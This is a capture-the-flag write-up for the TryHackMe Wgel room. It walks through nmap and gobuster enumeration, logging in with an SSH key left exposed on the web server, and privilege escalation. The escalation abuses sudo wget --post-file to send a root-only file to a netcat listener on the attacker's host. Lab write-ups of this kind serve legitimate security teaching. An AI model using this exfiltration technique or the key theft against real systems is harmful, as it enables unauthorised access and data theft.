# [Wgel CTF](https://tryhackme.com/room/wgelctf)

`Machine's IP - 10.10.33.168`

# Reconnaissance and Discovery
So, the first thing was to start out with a simple nmap scan and outputting the results to a log file.

`nmap -sS -sC -sV 10.10.33.168 -Pn > nmap-wgel.log`

# Analyzing Information and Risks


```
Starting Nmap 7.70 ( https://nmap.org ) at 2020-11-18 21:23 Central Standard Time (Mexico)
Nmap scan report for 10.10.33.168
Host is up (0.60s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 94:96:1b:66:80:1b:76:48:68:2d:14:b5:9a:01:aa:aa (RSA)
|   256 18:f7:10:cc:5f:40:f6:cf:92:f8:69:16:e2:48:f4:38 (ECDSA)
|_  256 b9:0b:97:2e:45:9b:f3:2a:4b:11:c7:83:10:33:e0:ce (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 107.68 seconds
```

Realizing that `SSH` amd `HTTP` was open, I went to the website to see if maybe we can get some more information about the server. 

# Web Analysis

Upon entering `http://10.10.33.168/` I noticed that it was the default starting template for Apache2. The strange thing was that the listing was wrong, look:

```bash
/etc/apache2/
|-- apache2.conf
|       `--  ports.conf
|-- mods-enabled
|       |-- *.load
|       `-- *.conf
|-- conf-enabled
|       `-- *.conf
|-- sites-enabled
|       `-- *.conf


 
          
```

If you've used Apache2 before, you'd know something was wrong too, so I viewed the source file and found this:

```
 <!-- Jessie don't forget to udate the webiste -->
```

So, we can guess the user is `Jessie`.

# Directory Enumeration

### Gobuster 

With `Gobuster` I was able to determine that the url given to us had a directory in it.

`gobuster dir -u http://ip/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt`

I found.

```
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.178.77
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2021/10/24 16:59:12 Starting gobuster in directory enumeration mode
===============================================================
/sitemap              (Status: 301) [Size: 314] [--> http://10.10.178.77/sitemap/]
Progress: 145 / 220561 (0.07%)    
```

Upon searching the site found in that directory, I couldn't find anything useful so I returned to the directory enumeration on this new url. With the common files found I just didn't find anything useful in other directories or files. So, I decided to find other type of files and extensions.

`gobuster dir -u http://ip/sitemap -w /usr/share/wordlists/dirb/common.txt`

I found.

```
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.178.77/sitemap/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2021/10/24 17:02:39 Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 277]
/.htaccess            (Status: 403) [Size: 277]
/.htpasswd            (Status: 403) [Size: 277]
/.ssh                 (Status: 301) [Size: 319] [--> http://10.10.178.77/sitemap/.ssh/]
Progress: 172 / 4615 (3.73%) 
```

And bingo! We found an `SSH` key that could belong to the user found previously.

### Dirbuster

Using dirbuster, I was able to find `http://ip/sitemap/` and the previous mentioned information. Here, I decided to try getting an indexing page and stumbled upon `http://10.10.33.168/sitemap/.ssh/` which gave me an `id_rsa`. 

# Initial foothold

Quickly, I downloaded the key and prepared myself for SSH login.

First, I renamed the file to match with the user \
`mv id_rsa.txt id_jessie`

Secondly, I changed the permissions of the file \
`chmod 600 id_jessie`

Finally, I got in `ssh -i id_jessie jessie@10.10.33.168` and had a console. 

Once inside, I looked for the `user.txt`.

```bash
jessie@CorpOne:~$ find | grep flag
./Documents/user_flag.txt
jessie@CorpOne:~$ cat ~/Documents/user_flag.txt
********************************
```

I tried to enumerate my permissions after that with `sudo -l` and noticed something strange but interesting

```bash
User jessie may run the following commands on CorpOne:
    (ALL : ALL) ALL
    (root) NOPASSWD: /usr/bin/wget
```

Once read that, I immediately opened a new tab and went to [GTFOBins](https://gtfobins.github.io/) and searched for `wget`. Here, I was bestowed upon me the following command

```bash
wget --post-file=$LFILE $URL
```

I got another tab in bash open, started a `Netcat` listener

```bash
> nc -lvnp 4445
listening on [any] 4445 ...
```

On my SSH key I ran the following command

```bash
jessie@CorpOne:~$ sudo /usr/bin/wget --post-file=/root/root_flag.txt http://10.6.20.112:4445/
--2020-11-19 05:47:41--  http://10.6.20.112:4445/
Connecting to 10.6.20.112:4445... connected.
```

And just like that, I got the `root.txt`

```bash
> nc -lvnp 4445
listening on [any] 4445 ...
connect to [10.6.20.112] from (UNKNOWN) [10.10.33.168] 43532
POST / HTTP/1.1
User-Agent: Wget/1.17.1 (linux-gnu)
Accept: */*
Accept-Encoding: identity
Host: 10.6.20.112:4445
Connection: Keep-Alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 33

********************************
```

## License
[MIT](https://choosealicense.com/licenses/mit/)
